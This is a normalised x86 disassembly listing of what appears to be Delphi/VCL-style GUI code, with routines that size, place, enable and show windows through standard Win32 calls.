retn 0xc
sub_44e1d4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_44a180
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_44e22c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_42168c
mov edx [ r-xdata ]
call sub_403518
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_44e264
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_4188a0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44e288
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_44f7b4
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_44e2e4
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_44e250
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_4188a0
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_44e324
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_405b1c
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_405b1c
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_44e390
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_44e438
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e43f
lea eax [ ebp - 0x4 ]
call sub_405b04
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_446c38
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403368
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_405b04
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403564
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_405b1c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ edi + 0x178 ] eax
sub_44e448
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_44c04c
xor edx edx
push ebp
push sub_44e50a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403564
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e511
mov eax [ ebp - 0x4 ]
call sub_44c054
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_44e511
mov eax [ ebp - 0x4 ]
call sub_45fd40
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_449214
sub_44e55c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4032b0
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44ae40
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_44e5c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403564
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_449214
sub_44e5e0
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_44e608
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_45fd40
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_45fc48
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403564
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44e608
test al al
jne r-xdata
sub_44e670
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e608
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_450900
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e69c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e608
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_450900
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e6c8
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_44e6f0
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_45fd40
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_45fc48
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403564
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44e6f0
test al al
jne r-xdata
sub_44e758
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e6f0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e778
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e6f0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e7b8
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_45fd40
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403564
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44e7b8
test al al
jne r-xdata
sub_44e81c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e7b8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e83c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c4e4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44c4a8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_44a180
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44e83c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_44e8ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_44e83c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_45fd40
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_44a180
test eax eax
jne r-xdata
sub_44e994
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44d434
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e9b4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44d434
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e9e8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44d434
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44ea08
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_44ea58
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_44ea7c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_448258
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_44c4e4
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_44c4a8
mov dl [ esp ]
mov si 0xffd1
call sub_403564
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_44ead4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403564
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_44eaf8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403564
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_44eb30
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44ac54
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_44c544
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_44cd54
sub_44eb68
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403564
pop esi
pop ebx
retn
mov eax ebx
call sub_449610
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_404624
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_404624
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_44ebe8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44d134
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44ad28
sub_44ec48
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_44cea8
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_44c2a4
pop ebx
retn
sub_44ec78
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_44eca0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_44fab8
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_44c2a4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_44ed10
push ebx
mov ebx eax
mov eax ebx
call sub_44ab94
mov eax ebx
call sub_44fab8
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_44c544
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_4241ec
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_44a180
sub_44ed4c
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_447838
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_44f7b4
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_44a180
sub_44ed8c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44fab8
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_44f7b4
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44edcc
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_44c544
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_44fab8
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_44f6bc
sub_44ee0c
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_44f8f4
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_44f8f4
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_44ee6c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_449bdc
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_448af8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_44d0a0
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_44eedc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44accc
mov edx esi
mov eax ebx
call sub_44c504
pop esi
pop ebx
retn
sub_44eef8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_445ec8
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_45fd40
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403564
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403564
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403564
test al al
jne r-xdata
sub_44ef8c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_450900
mov edx esi
mov eax ebx
call sub_44eef8
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_44a180
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_44a180
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_44a180
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_45fd40
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_44a180
test eax eax
jne r-xdata
jmp r-xdata
sub_44f070
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_44a180
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_44f0c4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_44a180
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_45fd40
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_44a180
test eax eax
jne r-xdata
sub_44f110
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_44eef8
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_44a180
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_45fd40
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_44a180
test eax eax
jne r-xdata
sub_44f16c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_45fd40
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_44a180
mov [ esi + 0xc ] eax
sub_44f1a0
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_44fab8
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44fab8
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_4485e0
mov eax ebx
mov si 0xffd0
call sub_403564
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_448954
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44f278
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_44c4e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_44c4a8
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403564
inc edi
dec ebx
jne r-xdata
sub_44f2c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44c04c
xor eax eax
push ebp
push sub_44f35e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44f278
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_448bd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f365
mov eax [ ebp - 0x4 ]
call sub_44c054
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_44f36c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
